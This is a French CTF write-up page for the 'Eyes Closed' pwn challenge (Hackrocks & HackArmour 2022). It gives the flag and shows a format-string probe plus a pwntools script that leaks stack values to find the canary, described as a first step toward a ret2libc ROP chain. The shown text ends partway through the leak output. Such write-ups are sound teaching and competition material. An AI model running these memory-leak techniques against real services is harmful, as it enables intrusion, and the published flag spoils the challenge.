@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+    Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR] - Vozec&#39;s Blog
+  </title>
+
+  <meta name="description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022" />
+  <meta name="keywords" content="tuto,reverse,howto,ctf,eyes closed,ctftime,hackArmour,ropchain,rop,ret2libc,vozec" />
+  <meta name="generator" content="Hugo 0.105.0">
+
+  <link rel="stylesheet" href="https://vozec.fr/css/main.css" />
+
+  
+  
+
+  <meta property="og:title" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]" />
+<meta property="og:description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vozec.fr/writeups/eyes_closed-hackarmour-2022/" /><meta property="og:image" content="https://vozec.fr/vozec.png"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-05-22T12:00:00+00:00" />
+<meta property="article:modified_time" content="2022-05-22T12:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://vozec.fr/vozec.png"/>
+
+<meta name="twitter:title" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]"/>
+<meta name="twitter:description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022"/>
+
+
+  <meta itemprop="name" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]">
+<meta itemprop="description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022"><meta itemprop="datePublished" content="2022-05-22T12:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-22T12:00:00+00:00" />
+<meta itemprop="wordCount" content="1648"><meta itemprop="image" content="https://vozec.fr/vozec.png"/>
+<meta itemprop="keywords" content="pwn,tuto,writeup," />
+
+  <meta itemprop="name" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]">
+<meta itemprop="description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022"><meta itemprop="datePublished" content="2022-05-22T12:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-22T12:00:00+00:00" />
+<meta itemprop="wordCount" content="1648"><meta itemprop="image" content="https://vozec.fr/vozec.png"/>
+<meta itemprop="keywords" content="pwn,tuto,writeup," />
+</head><body class="flex relative h-full min-h-screen"><aside
+  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
+  <p class="font-bold mb-5 flex items-center gap-2">
+    <button aria-label="Close sidebar"
+      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+</svg></button>
+    <a href="https://vozec.fr/" class="px-2">
+      <span>Vozec&#39;s Blog</span>
+    </a>
+    <button aria-label="Toggle dark mode"
+      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <circle cx="12" cy="12" r="4" />
+  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
+</svg></button>
+  </p>
+
+  
+  <ul class="list-none flex flex-col gap-1">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/" >
+        <span>Home</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
+        href="#" >
+        <span>C͟o͟n͟t͟e͟n͟t͟ ✒️</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles" >
+        <span> 〰️ Articles</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/writeups" >
+        <span> 〰️ Writeups</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
+        href="#" >
+        <span>F͟r͟o͟m͟ 0 T͟o͟ C͟r͟y͟p͟t͟o͟ 🔐</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/crypto-rsa" >
+        <span> 〰️ Rsa Courses</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/crypto-aes" >
+        <span> 〰️ Aes Courses</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/crypto-other" >
+        <span> 〰️ Other Courses</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
+        href="#" >
+        <span>A͟b͟o͟u͟t͟ M͟e͟👀</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/contact" >
+        <span> 〰️ Contact Me</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://flag-poisoning.fr"  target="_blank"
+        rel="noopener" >
+        <span> 〰️ My Ctf Team </span>
+        
+        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <path d="M11 7h-5a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-5" />
+  <line x1="10" y1="14" x2="20" y2="4" />
+  <polyline points="15 4 20 4 20 9" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+  </ul>
+
+  <div class="flex-1"></div>
+
+  
+
+  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://twitter.com/Vozec1" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Twitter</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://github.com/Vozec" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">GitHub</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://www.linkedin.com/in/arthur-deloffre-844b7a221/" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">LinkedIn</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
+  <rect x="2" y="9" width="4" height="12" />
+  <circle cx="4" cy="4" r="2" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="mailto:arthursd444@gmail.com" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Email</span>
+        
+        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <rect x="3" y="5" width="18" height="14" rx="2" />
+  <polyline points="3 7 12 13 21 7" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://www.instagram.com/arthur_dlfr/" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Instagram</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
+  <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+  <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+  </ul>
+</aside>
+
+<div
+  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
+</div>
+
+<button aria-label="Toggle Sidebar"
+  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="4" y1="6" x2="20" y2="6" />
+  <line x1="4" y1="12" x2="20" y2="12" />
+  <line x1="4" y1="18" x2="16" y2="18" />
+</svg></button>
+<div class="flex-1">
+
+
+
+
+<div class="flex max-h-screen relative overflow-y-auto h-full">
+  
+  <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg dark:prose-invert h-fit prose-img:mx-auto">
+    
+    <a href="https://vozec.fr/writeups/" class="!no-underline !text-slate-500 !mb-2 !inline-block !font-normal !text-sm hover:!text-slate-700 dark:hover:!text-slate-400">← Back to list</a>
+
+    
+    <h1 class="!mb-2">Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]</h1>
+    
+    <p class="text-sm text-slate-500 !mb-8">May 22, 2022</p>
+    
+
+    
+
+    <h1 id="eyes-closed--hackrocks--hackarmour-ctf-2022">Eyes Closed | Hackrocks &amp; HackArmour CTF 2022</h1>
+<h2 id="necessaires">Necessaires</h2>
+<ul>
+<li>Netcat</li>
+<li>Python3 (+ pwntool)</li>
+</ul>
+<h2 id="flag">Flag</h2>
+<pre tabindex="0"><code>flag{br0p0p0p0p0_with_f0rm4t_$7ringggg}
+</code></pre><h2 id="solution-détaillée">Solution détaillée</h2>
+<p>Le but du challenge est d&rsquo;exploiter une format string puis d&rsquo;utiliser un buffer overflow pour ainsi construire une ropchain et ainsi pouvoir prendre le contrôle du binaire grâce à une attaque ret2libc.</p>
+<h5 id="un-peu-dexplication-">Un peu d&rsquo;explication :</h5>
+<p>La méthode finale est la même que dans un de mes <a href="https://vozec.fr/writeups/vacation2-tjctf-2022/"  target="_blank" rel="noopener" >précédents article</a> .
+Ce Writeup va donc se focaliser sur la partie <strong>Blind</strong> du challenge ainsi que l&rsquo;exploitation des <strong>formats strings</strong></p>
+<h5 id="découverte-du-challenge-">Découverte du challenge :</h5>
+<p>Seule une connexion TCP nous ai donné</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   nc warzone.hackrocks.com <span style="color:#bd93f9">7772</span>
+</span></span><span style="display:flex;"><span>close your eyes and imagine something
+</span></span><span style="display:flex;"><span>tell me, what did you see?:
+</span></span><span style="display:flex;"><span>INPUT1
+</span></span><span style="display:flex;"><span>a INPUT1 ?nice one
+</span></span><span style="display:flex;"><span>please, give me a feedback:
+</span></span><span style="display:flex;"><span>INPUT2
+</span></span><span style="display:flex;"><span>thanks, see you later
+</span></span></code></pre></div><p>Une première chose qui saute au yeux est que notre première entrée est réfléchis .</p>
+<p>Voici ce que l&rsquo;on obtient si on envoie des <strong>formats strings</strong> : <code>%p.%p.%p.%p.%p.%p.%p.%p</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>close your eyes and imagine something
+</span></span><span style="display:flex;"><span>tell me, what did you see?:
+</span></span><span style="display:flex;"><span>%p.%p.%p.%p.%p.%p.%p.%p
+</span></span><span style="display:flex;"><span>a 0x7ffdfbc1c8f0.<span style="color:#ff79c6">(</span>nil<span style="color:#ff79c6">)</span>.<span style="color:#ff79c6">(</span>nil<span style="color:#ff79c6">)</span>.0x17.0xffffffffffffff88.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70 ?nice one
+</span></span><span style="display:flex;"><span>please, give me a feedback:
+</span></span></code></pre></div><p>On a donc un leak directement dans la mémoire du binaire !</p>
+<p>La description du challenge nous informe sur les sécurités du binaire exécuté à distance :</p>
+<ul>
+<li><em>Canary</em> : <code>ON</code></li>
+<li><em>NX</em> : <code>ON</code></li>
+<li><em>PIE</em> : <code>ON</code></li>
+<li><em>RELRO</em> : <code>ON</code></li>
+</ul>
+<p>On va donc essayer de contourner la protection : <code>Canary</code></p>
+<h6 id="explication-de-la-protection-canary">Explication de la protection Canary</h6>
+<p>Imaginons un buffer de 60 caractères , un canary est un octet qui va se positionner en 61ème place et qui va contrôler qu&rsquo;aucun débordement de mémoire n&rsquo;a lieu :</p>
+<ul>
+<li>
+<p><code>Mémoire Classique</code> :
+<em>[</em>&mdash;&mdash;&mdash;-MA-MEMOIRE&mdash;&mdash;&mdash;<em>]</em> <em>[</em>&mdash;-CANARY&mdash;-<em>]</em> <em>[</em>&mdash;-SUITE&mdash;-<em>]</em></p>
+</li>
+<li>
+<p><code>Mémoire Avec un overflow</code> :
+<em>[<em>AAAAAAAAAAAAAAAAAAAAAAAAAAAAA] <strong>AAAAAA</strong> <em>[</em>&mdash;-CANARY&mdash;-</em>]</em>[<em>&mdash;-SUITE&mdash;-</em>]_</p>
+</li>
+</ul>
+<p>Ici , la place du Canary a était modifié de +6 avec un Overflow et la protection va se déclencher et arrêter le programme.</p>
+<p>On devine que la 2nd entrée est vulnérable à un <strong>Buffer Overflow</strong> . On peut être en évidence la protection Canary :</p>
+<p><img src="./img/canary.png" alt="Alt text"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>    <span style="color:#bd93f9">373</span> abort      ./eyes_closed
+</span></span></code></pre></div><h5 id="leak-de-la-mémoire-">Leak de la mémoire :</h5>
+<p>On peut donc écrire un programme pour faire leak la mémoire et localiser le Canary :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url  <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;warzone.hackrocks.com&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">7772</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Get_proc</span>():	<span style="color:#ff79c6">return</span> remote(url,port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Dump_stack</span>(string<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34; [+] Leaking all the Stack ...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">200</span>):
+</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>		payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span>(string):
+</span></span><span style="display:flex;"><span>			payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;AAAA....</span><span style="color:#f1fa8c">%%%d</span><span style="color:#f1fa8c">$p....</span><span style="color:#f1fa8c">%%%d</span><span style="color:#f1fa8c">$s&#34;</span> <span style="color:#ff79c6">%</span> (_,_)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>			payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;AAAA....</span><span style="color:#f1fa8c">%%%d</span><span style="color:#f1fa8c">$p&#34;</span> <span style="color:#ff79c6">%</span> _
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>recvline()
+</span></span><span style="display:flex;"><span>		res <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39; &#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> - </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">%</span>(_,res))
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dump_stack(<span style="color:#ff79c6">True</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   python3 writeup.py
+</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Leaking all the Stack ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span> - b<span style="color:#f1fa8c">&#39;AAAA....%0$p&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7ffea4af1bd0&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span> - b<span style="color:#f1fa8c">&#39;AAAA....0xc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5</span> - b<span style="color:#f1fa8c">&#39;AAAA....0xffffffffffffff88&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x2e2e2e2e41414141&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x70243725&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">11</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">12</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">13</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">14</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">15</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">16</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">17</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x2009005&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">18</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7ffe2116c788&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">19</span> - b<span style="color:#f1fa8c">&#39;AAAA....0xb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">20</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x1&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">21</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">22</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x2009005&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">23</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7fbecbe9b6fe&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">24</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">25</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x1800000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">26</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x800&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">27</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">28</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x8000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">29</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x8&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">30</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">31</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">32</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">33</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">34</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7fff92e37fd9&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">35</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">36</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">37</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">38</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">39</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">40</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">41</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">42</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">43</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x5588e59d12c5&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">44</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">45</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x56526d234280&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">46</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">47</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x559eb6193090&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">48</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7ffc04377b40&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">49</span> - b<span style="color:#f1fa8c">&#39;AAAA....0xf0285d4279221400&#39;</span>
